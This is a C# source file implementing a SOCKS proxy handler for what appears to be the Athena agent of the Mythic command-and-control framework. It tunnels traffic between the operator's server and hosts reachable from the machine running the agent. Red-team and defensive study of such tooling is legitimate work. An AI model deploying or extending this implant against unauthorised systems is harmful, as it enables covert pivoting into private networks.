using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
        private ConcurrentQueue<SocksMessage> messagesOut = new ConcurrentQueue<SocksMessage>();
        private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
        public bool running { get; set; }
        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, ConnectionOptions>();
        }

        public bool Start()
        {
            this.ct = new CancellationTokenSource();
            try
            {
                //Read
                Task.Run(() => { ReadMythicMessages(); });
                Task.Run(() => { ReadServerMessages(); });
            }
            catch
            {
                this.Stop();
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            try
            {
                this.running = false;
                this.ct.Cancel();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public List<SocksMessage> getMessages()
        {
            //Is it possible to receive messages in between the time I call ToList() and when I call Clear()?
            //I should probably add locking to prevent it if true.
            List<SocksMessage> messages = this.messagesOut.ToList();
            this.messagesOut.Clear();
            messages.Reverse();
            return messages;
        }

        public void AddToQueue(SocksMessage message)
        {
            this.messagesIn.Enqueue(message);
        }

        //This function will take messages FROM mythic and forward them to the Server.
        //Client -> Mythic -> Athena -> Server
        private void ReadMythicMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                SocksMessage sm;
                while (!messagesIn.TryDequeue(out sm)) { }
                //Misc.WriteDebug(messagesIn.Count().ToString());
                Task.Run(() => { HandleMessage(sm); });
            }
        }

        public int Count()
        {
            return this.messagesOut.Count();
        }
        //This function will send messages from the Server TO mythic.
        //Server -> Athena -> Mythic -> Client
        private void ReadServerMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                Parallel.ForEach(this.connections, connection =>
                {
                    try
                    {
                        List<byte[]> outMessages = connection.Value.receiveMessages();
                        
                        foreach(var msg in outMessages)
                        {
                            SocksMessage smOut = new SocksMessage()
                            {
                                server_id = connection.Value.server_id,
                                data = Misc.Base64Encode(msg),
                                exit = false
                            };
                            this.messagesOut.Enqueue(smOut);

                        }

                        if (!connection.Value.socket.Connected)
                        {
                            //Misc.WriteDebug($"{connection.Key} closed socket.");
                            SocksMessage smOut = new SocksMessage()
                            {
                                server_id = connection.Key,
                                data = "",
                                exit = true
                            };

                            //Add to our messages queue.
                            this.messagesOut.Enqueue(smOut);
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        //ConnectionOptions cn;
                        //while (!this.connections.TryRemove(connection.Key, out cn)) { }
                        //Misc.WriteDebug("Removed Connection.");
                    }
                });
            }
        }

        private void HandleMessage(SocksMessage sm)
        {
            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
            //Should I be doing this?

            if (this.connections.ContainsKey(sm.server_id))
            {
                //We already know about this connection, so let's just forward the data.
                if (!this.connections[sm.server_id].ForwardPacket(sm))
                {
                    //Do Something
                }
            }
            else
            {
                ConnectionOptions cn = new ConnectionOptions(sm);
                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id
                };

                if (cn.connected)
                {
                    this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
                    smOut.exit = false;
                }
                else
                {
                    smOut.exit = true;
                }

                ConnectResponse cr = new ConnectResponse()
                {
                    status = ConnectResponseStatus.Success,
                    bndaddr = cn.bndBytes,
                    bndport = cn.bndPortBytes,
                    addrtype = cn.addressType
                };
                
                //Put our ConnectResponse into the SocksMessage
                smOut.data = Misc.Base64Encode(cr.ToByte());

                //Add to our message queue
                this.messagesOut.Enqueue(smOut);
            }
        }
    }
}
